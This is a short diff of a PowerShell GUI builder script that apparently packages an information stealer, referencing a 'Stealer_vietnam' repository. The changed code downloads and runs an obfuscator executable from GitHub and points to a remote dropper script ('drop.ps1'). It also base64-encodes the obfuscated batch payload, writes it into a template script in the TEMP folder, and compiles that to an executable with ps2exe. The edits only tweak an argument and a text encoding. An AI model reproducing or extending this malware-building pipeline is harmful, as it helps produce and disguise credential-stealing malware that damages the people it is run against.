@@ -140,7 +140,7 @@ $button.Add_Click({
         $protectPath = ".\batchobfuscator.exe"  # Change this to the correct path
         Invoke-WebRequest -Uri "https://github.com/KDot227/SomalifuscatorV2/releases/download/AutoBuild/main.exe" -OutFile $protectPath
         # Execute the .bat file
-        Start-Process -FilePath $protectPath -ArgumentList "-f `"$filePath`" -nu" -NoNewWindow -Wait
+        Start-Process -FilePath $protectPath -ArgumentList "-f `"$filePath`"" -NoNewWindow -Wait
         # Start-Process -FilePath $compliePath -ArgumentList "`"$filePathprotect`"" -NoNewWindow -Wait
         $url = "https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/drop/drop.ps1"
 
@@ -148,7 +148,7 @@ $button.Add_Click({
         $encodedFileContent = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($filePathprotect))
 
         $pathexe = ".\main.exe"
-        $scriptContent -replace "batcodeinhere", ([System.IO.File]::ReadAllText($filePathprotect, [System.Text.Encoding]::UTF8)) | Set-Content -Path "$env:TEMP\main.ps1"
+        $scriptContent -replace "batcodeinhere", ([System.IO.File]::ReadAllText($filePathprotect, [System.Text.Encoding]::UTF16)) | Set-Content -Path "$env:TEMP\main.ps1"
          
         Invoke-ps2exe "$env:TEMP\main.ps1" "$pathexe"
 
